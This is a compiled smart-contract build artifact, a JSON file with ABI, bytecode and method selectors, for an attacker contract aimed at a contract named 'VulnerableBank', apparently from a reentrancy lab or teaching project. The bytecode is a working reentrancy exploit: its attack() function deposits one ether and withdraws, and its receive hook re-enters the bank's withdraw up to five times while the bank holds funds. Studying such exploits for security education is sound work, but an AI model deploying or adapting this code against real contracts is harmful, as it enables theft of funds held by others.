{"abi":[{"type":"constructor","inputs":[{"name":"_vulnerableBank","type":"address","internalType":"address"}],"stateMutability":"nonpayable"},{"type":"receive","stateMutability":"payable"},{"type":"function","name":"attack","inputs":[],"outputs":[],"stateMutability":"payable"},{"type":"function","name":"attackCount","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"getBalance","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"maxAttacks","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"vulnerableBank","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract VulnerableBank"}],"stateMutability":"view"}],"bytecode":{"object":"0x60806040526005600255348015610014575f5ffd5b50604051610667380380610667833981810160405281019061003691906100d9565b805f5f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610104565b5f5ffd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100a88261007f565b9050919050565b6100b88161009e565b81146100c2575f5ffd5b50565b5f815190506100d3816100af565b92915050565b5f602082840312156100ee576100ed61007b565b5b5f6100fb848285016100c5565b91505092915050565b610556806101115f395ff3fe60806040526004361061004d575f3560e01c806312065fe014610142578063407c28211461016c5780639e5faafc14610196578063a1c9aee1146101a0578063a37573d6146101ca5761013e565b3661013e576002546001541080156100a45750670de0b6b3a76400005f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163110155b1561013c5760015f8154809291906100bb906103a6565b91905055505f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b81526004015f604051808303815f87803b158015610125575f5ffd5b505af1158015610137573d5f5f3e3d5ffd5b505050505b005b5f5ffd5b34801561014d575f5ffd5b506101566101f4565b60405161016391906103fc565b60405180910390f35b348015610177575f5ffd5b506101806101fb565b60405161018d91906103fc565b60405180910390f35b61019e610201565b005b3480156101ab575f5ffd5b506101b4610346565b6040516101c1919061048f565b60405180910390f35b3480156101d5575f5ffd5b506101de61036a565b6040516101eb91906103fc565b60405180910390f35b5f47905090565b60015481565b670de0b6b3a764000034101561024c576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161024390610502565b60405180910390fd5b5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0346040518263ffffffff1660e01b81526004015f604051808303818588803b1580156102b2575f5ffd5b505af11580156102c4573d5f5f3e3d5ffd5b50505050505f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b81526004015f604051808303815f87803b15801561032e575f5ffd5b505af1158015610340573d5f5f3e3d5ffd5b50505050565b5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60025481565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f819050919050565b5f6103b08261039d565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff82036103e2576103e1610370565b5b600182019050919050565b6103f68161039d565b82525050565b5f60208201905061040f5f8301846103ed565b92915050565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f819050919050565b5f61045761045261044d84610415565b610434565b610415565b9050919050565b5f6104688261043d565b9050919050565b5f6104798261045e565b9050919050565b6104898161046f565b82525050565b5f6020820190506104a25f830184610480565b92915050565b5f82825260208201905092915050565b7f4e656564206174206c65617374203120657468657200000000000000000000005f82015250565b5f6104ec6015836104a8565b91506104f7826104b8565b602082019050919050565b5f6020820190508181035f830152610519816104e0565b905091905056fea26469706673582212200653cc70150aba1e49ad1b439ba0db386e9123b9b504cd42fd117fe558c1baa264736f6c63430008210033","linkReferences":{}},"methodIdentifiers":{"attack()":"9e5faafc","attackCount()":"407c2821","getBalance()":"12065fe0","maxAttacks()":"a37573d6","vulnerableBank()":"a1c9aee1"},"id":19}